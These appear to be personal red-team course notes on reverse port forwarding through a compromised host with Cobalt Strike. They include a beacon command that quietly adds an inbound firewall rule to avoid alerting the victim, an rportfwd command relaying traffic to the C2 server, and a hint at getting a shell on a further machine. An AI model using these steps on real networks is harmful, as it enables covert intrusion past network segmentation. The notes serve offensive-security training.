
Reverse Port Forwarding allows a machine to redirect inbound traffic on a specific port to another IP and port.

A useful implementation of this allows machines to bypass firewall and other network segmentation restrictions, to talk to nodes they wouldn't normally be able to.

## 🖊️ via [[Cobalt Strike]]

We may want to use a pwned machine (that talks to our C2) as an intermediary to reach a machine that does not talk to the C2. We can use Reverse Port Forwards.

1) You create an allow rule **before** running a reverse port forward using either `netsh` or `New-NetFirewallRule`, as adding and removing rules does not create a visible alert. Otherwise the victim will get a pop-up when we try to open this port.

`beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`


2) Then we can create a reverse port forward to relay traffic between the remote box and our team server.

```
beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```

Syntax:
```
	8080 - port that will be opened in the intermediary box
	 127.0.0.1 - C2 IP
	 80 - C2 listener port
```

Now the remote box can have access to our C2. You could also try to run a payload in the remote box to obtain a shell via this channel.
 

### ⚠ Opsec




### Properties
---
📆 created   {{17-02-2024}} 19:11
🏷️ tags: #redteam #crto 

---

